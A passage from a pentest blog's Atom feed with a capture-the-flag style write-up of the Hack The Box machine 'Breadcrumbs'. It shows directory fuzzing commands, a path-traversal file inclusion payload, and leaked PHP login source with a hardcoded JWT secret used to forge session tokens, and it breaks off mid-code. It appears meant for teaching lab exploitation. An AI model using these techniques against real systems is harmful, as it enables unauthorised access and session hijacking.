<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-08-08T20:11:49+02:00</updated><id>/feed.xml</id><title type="html">PCW3R</title><subtitle>Teach and share you techniques used by the hackers through pentest labs and challenges.</subtitle><entry><title type="html">Breadcrumbs - Let me steal your web session!</title><link href="/posts/HTB-19-Pentest-Breadcrumbs/" rel="alternate" type="text/html" title="Breadcrumbs - Let me steal your web session!" /><published>2021-07-17T00:00:00+02:00</published><updated>2021-07-17T00:00:00+02:00</updated><id>/posts/HTB-19-Pentest-Breadcrumbs</id><content type="html" xml:base="/posts/HTB-19-Pentest-Breadcrumbs/">&lt;p&gt;Breadcrumbs is a vulnerable machine through :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Foothold &amp;gt; Cookie Hijacking from LFI in php files&lt;/li&gt;
  &lt;li&gt;Lateral movement &amp;gt; Reusing credentials plaintext&lt;/li&gt;
  &lt;li&gt;Privilege Escalation &amp;gt; SQL Injection in Password Manager `&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h1&gt;
&lt;h2 id=&quot;network-service-scanning&quot;&gt;Network Service Scanning&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-nmap.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;website-on-port-80--443&quot;&gt;Website on port 80 / 443&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.228/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-website.png&quot; alt=&quot;Desktop View&quot; /&gt;
&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-website-2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;website-directory-scanning&quot;&gt;Website Directory scanning&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-dirb-1.png&quot; alt=&quot;Desktop View&quot; /&gt;
&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-dirb-2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;website-fuzzing&quot;&gt;Website Fuzzing&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/big.txt &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404,403 http://10.10.10.228/portal/FUZZ.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-wfuzz.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;public-file-and-directory&quot;&gt;Public file and directory&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Publicly available upload file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://10.10.10.228/portal/uploads/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-uploads.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get list of all users from admins.php. Only 3 users are active: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Olivia&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Paul&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.228/portal/php/admins.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-admins.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;login-page-and-portal-access&quot;&gt;Login page and portal access&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.228/portal/login.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-login.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.228/portal/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-interface.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get here privilege of each users. So if we combine with previous information about users, we can target next user : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Paul&lt;/code&gt; (because he is an admin and his session is still active).&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.228/portal/php/users.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-users.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The page issues.php reveal a hint about PHPSESSID …. let’s start to find way around this.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.228/portal/php/issues.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-hint.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;local-file-inclusion-from-php-files&quot;&gt;Local File Inclusion from php files&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;When we search book or anything from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bookController.php&lt;/code&gt; we have possibility to generate an error with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;method=1&lt;/code&gt; in request and this allow the reveal of array key &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Book&lt;/code&gt; and action &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_get_contents(../books/)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-lfi-book.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We test LFI to get php.ini and it’s work!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;book=../../../../../../Users/www-data/Desktop/xampp/php/php.ini&amp;amp;method=1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-lfi-test.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We recover the secret_key from authController.php to generate TOKEN: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Reference: &lt;a href=&quot;https://extendsclass.com/php.html&quot;&gt;https://extendsclass.com/php.html&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'db\/db.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cookie.php&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
require &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;vendor\/autoload.php&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
use \Firebase\JWT\JWT;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = array();
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userdata&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = array();
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = false;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER['REMOTE_ADDR']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;

\/\/if user clicks on login
if(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER['REQUEST_METHOD']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; === &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;){
    if(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST['method']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; == 0){
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST['username']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST['password']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;SELECT username,position FROM users WHERE username=? LIMIT 1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$con-&amp;gt;prepare&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;bind_param&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;('s', &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;execute&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;();
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;get_result&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;();
        while (&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result-&amp;gt;fetch_array&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;(MYSQLI_ASSOC)){
            array_push(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userdata&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
        }
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userCount&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result-&amp;gt;num_rows&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;close&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;();

        if(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userCount&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; 0){
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = sha1(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwordQuery&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;SELECT * FROM users WHERE password=? AND username=? LIMIT 1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$con-&amp;gt;prepare&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwordQuery&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;bind_param&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;('ss', &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;execute&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;();
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;get_result&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;();

            if(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result-&amp;gt;num_rows&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; 0){
                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = true;
            }
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;close&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;();
        }

        if(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;){
            session_id(makesession(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;));
            session_start();

            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret_key&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = array();

            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = array(
                &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; =&amp;gt; array(
                    &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; =&amp;gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
            ));

            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$jwt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = JWT::encode(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret_key&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;, 'HS256');
            
            setcookie(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$jwt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;, time() + (86400 * 30), &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);

            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION['username']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION['loggedIn']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = true;
            if(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userdata[0]['position']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; == &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;){
                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION['role']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Awaiting approval&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
            } 
            else{
                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION['role']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userdata[0]['position']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
            }
            
            header(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Location: \/portal&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
        }

        else{
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION['loggedIn']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = false;
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors['valid']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Username or Password incorrect&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        }
    }

    elseif(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST['method']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; == 1){
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST['username']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST['password']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwordConf&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST['passwordConf']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        
        if(empty(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)){
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors['username']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Username Required&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        }
        if(strlen(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) &amp;lt; 4){
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors['username']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Username must be at least 4 characters long&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        }
        if(empty(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)){
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors['password']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Password Required&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;; 
        }
        if(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; !== &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwordConf&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;){
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors['passwordConf']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Passwords don't match!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;; 
        }

        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userQuery&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;SELECT * FROM users WHERE username=? LIMIT 1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$con-&amp;gt;prepare&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userQuery&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -&amp;gt;bind_param('s',&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;execute&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;();
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;get_result&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;();
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userCount&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result-&amp;gt;num_rows&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;close&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;();

        if(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userCount&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; 0){
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors['username']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Username already exists&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
        }

        if(count(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) === 0){
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = sha1(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
